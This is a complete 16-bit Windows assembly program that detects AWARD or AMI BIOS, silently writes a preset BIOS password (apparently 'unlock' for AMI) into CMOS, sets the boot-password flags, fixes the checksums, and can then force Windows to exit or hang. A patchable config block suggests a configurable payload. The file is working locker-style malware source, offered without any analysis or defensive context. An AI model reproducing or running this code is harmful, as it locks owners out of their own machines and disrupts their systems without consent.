locals
.286
.model large, WINDOWS PASCAL
INCLUDE windows.inc

EXTRN   InitTask:PROC
EXTRN   ExitWindows:PROC

; import from CMOS library
EXTRN   ReadCMOS:PROC
EXTRN   WriteCMOS:PROC
EXTRN   ReadCMOSW:PROC
EXTRN   WriteCMOSW:PROC
EXTRN   CalculateChecksum:PROC

GLOBAL  SetAWARD:PROC
GLOBAL  SetAMI:PROC

.data

                DB 16 dup (0)

                DB 00Bh, 0ADh, 05Eh, 0EDh                       ; Config mark
		DB 2, 0						; Version
                DB 10                                           ; 10 bytes
ExitMode        DB 000h                                         ; Normal exit
AWARD           DB 0E9h, 065h                                   ; Password:
AMI             DB 0F0h, 03Dh, 0A8h, 0E6h, 078h, 0A3h, 090h     ; "unlock"

.code

Start:
        call    InitTask

        push    48h
        push    79h
        call    CalculateChecksum
        mov     bx, ax

        push    7Ah
        call    ReadCMOSW

        cmp     ax, bx
        jne     Try_AMI

        call    SetAWARD
        jmp     short Bye

Try_AMI:
        push    37h
        push    3Dh
        call    CalculateChecksum
        mov     bx, ax

        push    40h
        push    7Ch
        call    CalculateChecksum
        add     bx, ax

        push    3Eh
        call    ReadCMOSW

        cmp     ax, bx
        jne     Bye

        call    SetAMI

Bye:
        cmp     [ExitMode], 1
        jz      KillWindows
        cmp     [ExitMode], 2
        jz      HangWindows

Exit:
        mov     ax, 4C00h
        int     21h

KillWindows:
	push	0
	push	0
	push	0
	call	ExitWindows
        jmp     short Exit

HangWindows:
        cli
        jmp     short HangWindows


;*************************************
; Password storage routines
;*************************************
SetAWARD PROC PASCAL
        USES    ax

	push	11h
	call	ReadCMOS

	or      al, 3

	push	11h
	push	ax
	call	WriteCMOS

        push    1Ch
        push    [WORD PTR AWARD+0]
        call    WriteCMOS

        push    1Dh
        push    [WORD PTR AWARD+1]
        call    WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAWARD


SetAMI PROC PASCAL
        USES    ax, bx, si, di

        push    29h
	call	ReadCMOS

        or      al, 10h

        push    29h
	push	ax
	call	WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        mov     di, 37h
        mov     si, offset AMI

Send:
        push    di
        push    [si]
        call    WriteCMOS

        inc     si
        inc     di

        cmp     di, 3Dh
        jle     short Send

        push    37h
        push    3Dh
        call    CalculateChecksum
        mov     bx, ax

        push    40h
        push    7Ch
        call    CalculateChecksum
        add     ax, bx

        push    3Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAMI

END Start
